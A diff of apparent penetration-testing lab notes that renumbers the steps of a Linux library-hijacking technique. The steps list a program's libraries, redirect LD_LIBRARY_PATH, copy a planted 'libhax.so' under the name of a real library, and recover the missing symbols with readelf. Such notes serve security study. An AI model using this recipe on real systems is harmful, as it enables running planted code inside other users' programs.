@@ -56,25 +56,25 @@ gcc -shared -o libhax.so hax.o
 ```
 This will produce <span style="color:red">libhax.so</span>
 
-4) To check the libraries loaded by <span style="color:red">top</span>:
+3) To check the libraries loaded by <span style="color:red">top</span>:
 ```shell
 ldd /usr/bin/top
 ```
 Check what libraries you see and chose one that might not prevent normal use of the application.
 
-6) Set the environment variable and set the name of the exploit library to the one we want to hijack:
+4) Set the environment variable and set the name of the exploit library to the one we want to hijack:
 ```shell
 export LD_LIBRARY_PATH=/home/offsec/ldlib/
 cp libhax.so libgpg-error.so.0 (in folder specified above!)
 ```
 
-8) Find missing symbols (replace <span style="color:red">libgpg-error.so.0</span> with the library you are replacing):
+5) Find missing symbols (replace <span style="color:red">libgpg-error.so.0</span> with the library you are replacing):
 ```shell
 readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
 ```
 and copy output to the exploit shown in point 1.
 
-10) It might be that we still miss some symbols (based on the output error from running <span style="color:red">top</spen>), you can find them like so:
+6) It might be that we still miss some symbols (based on the output error from running <span style="color:red">top</spen>), you can find them like so:
 ```shell
 readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
 ```
